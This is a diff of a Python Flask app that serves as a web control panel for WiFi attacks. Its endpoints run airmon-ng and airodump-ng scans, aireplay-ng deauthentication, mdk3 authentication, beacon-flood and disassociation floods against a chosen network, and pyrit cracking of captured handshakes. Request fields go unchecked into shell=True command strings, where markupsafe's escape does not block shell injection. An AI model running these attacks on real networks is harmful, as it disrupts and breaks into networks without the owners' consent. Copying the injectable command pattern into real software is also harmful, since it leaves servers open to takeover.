@@ -1,20 +1,26 @@
 import threading
 import subprocess
 from markupsafe import escape
-from flask import request, session
+from flask import request
 from app import app, config
 from werkzeug.utils import secure_filename
 
+#Variables
 scanning = False
 scanAttack = False
+path = config['server']['filePath']
+mac = f"{config['mac']['oui']}:12:8c:b6"
+netcardMon = ""
+bssid = ""
+essid = ""
+channel = ""
 
 from app.utils import *
 
 
+
 @app.get('/')
 def index():
-    path = config['server']['filePath']
-    session["path"] = path
     mkdir = f'mkdir {path}'
     subprocess.run(mkdir, check=True, shell=True, capture_output=True)
     return ret({"status":"OK"})
@@ -28,12 +34,11 @@ def getNetcardMon():
 
 @app.post('/netcard')
 def setNetcardMon():
+    global netcardMon 
+    global scanning 
     data = req(request)
     netcard = escape(data.get('netcard', ''))
     netcardMon = netcard + "mon"
-    session["netcardMon"] = netcardMon
-    mac = f"{config['mac']['oui']}:12:8c:b6"
-    session["mac"] = mac
     scanning = False
 
     startMon = f'airmon-ng check kill && airmon-ng start {netcard}'
@@ -46,10 +51,10 @@ def setNetcardMon():
 
 @app.get('/stop')
 def stopNetcardMon():
+    global scanning 
+    global scanAttack
     scanning = False
     scanAttack = False
-    netcardMon = session.get("netcardMon") 
-    path = config['server']['filePath']
 
     stopServices = f'killall airodump-ng | airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'
     subprocess.run(stopServices, check=True, shell=True)
@@ -61,8 +66,6 @@ def stopNetcardMon():
 
 @app.get('/scan')
 def scan():
-    netcardMon = session.get('netcardMon') 
-    path = session.get('path')
 
     startScan = f'airodump-ng -w {path}/dumpData --output-format csv {netcardMon} > /dev/null'
     subprocess.Popen(startScan, shell=True)
@@ -75,22 +78,20 @@ def scan():
 
 @app.post('/target')
 def target():
+    global bssid
+    global essid
+    global channel
     data = req(request)
-    session['bssid'] = escape(data.get('bssid', ''))
-    session['essid'] = escape(data.get('essid', ''))
-    session['channel'] = escape(data.get('channel', ''))
+    
+    bssid = escape(data.get('bssid', ''))
+    essid = escape(data.get('essid', ''))
+    channel = escape(data.get('channel', ''))
     #TODO: Plantear target... aislado o conjunto??
     return ret({"status":"OK"})
 
 @app.post('/attack/<int:id>')
 def attack(id):
-    data = req(request)
-    netcardMon = session.get('netcardMon')
-    bssid = session.get('bssid')
-    essid = session.get('essid')
-    channel = session.get('channel')
-    path = session.get('path')
-    mac = session.get('mac')
+    global scanAttack
     scanAttack = True
 
     
@@ -102,6 +103,7 @@ def attack(id):
     match id:
         #WPA/WPA2 With Clients
         case 0: #Deauthentication
+            data = req(request)
             nPackets = escape(data.get('n'))
             attack = f'aireplay-ng -0 {nPackets} -a {bssid} {netcardMon}'
             pass
@@ -109,8 +111,8 @@ def attack(id):
             attack = f'mdk3 a -a {bssid} {netcardMon}'
             pass
         case 2: #Beacon Flood Mode Attack
-            fakeNets = escape(data.get('fn', ''))
-            attack = f'mdk3 b -f {fakeNets} -a -s 1000 -c {channel} {netcardMon}'
+            fakeNet = escape(data.get('fn', ''))
+            attack = f'mdk3 b -f FakeNetworks/{fakeNet} -a -s 1000 -c {channel} {netcardMon}'
             pass
         case 3: #Disassociation Amok Mode Attack
             attack = f'mdk3 d -w blacklist -c 1 {netcardMon}'
@@ -165,13 +167,14 @@ def attack(id):
 ###Cracking
 
 ##Cracking con Pyrit a través de ataque por Base de Datos RAINBOW TABLE
-@app.get('/crack/<string:wordlist>')
+@app.post('/crack/<string:wordlist>')
 def cracker(wordlist):
-    path = session.get('path')
-    essid = session.get('essid')
     wordlist = escape(wordlist)
+    data = req(request)
+    hash = escape(data.get('hash', ''))
+
     #Define DB
-    defineDB = f'pyrit -i wordlist/{wordlist} import_passwords'
+    defineDB = f'pyrit -i Wordlist/{wordlist} import_passwords'
     subprocess.run(defineDB, check=True, shell=True)
 
     #Define ESSID
@@ -183,7 +186,8 @@ def cracker(wordlist):
     subprocess.run(generatePMKS, check=True, shell=True)
 
     #Start cracking
-    startCrack =  f'pyrit -r {path}/dumpDataAttack-01.cap attack_db > passDB/{essid}'
+    #startCrack =  f'pyrit -r {path}/dumpDataAttack-01.cap attack_db > passDB/{essid}'
+    startCrack =  f'pyrit -r {path}/{hash} attack_db > passDB/{essid}'
     subprocess.run(startCrack, check=True, shell=True)
 
     return ret({"status":"OK"})
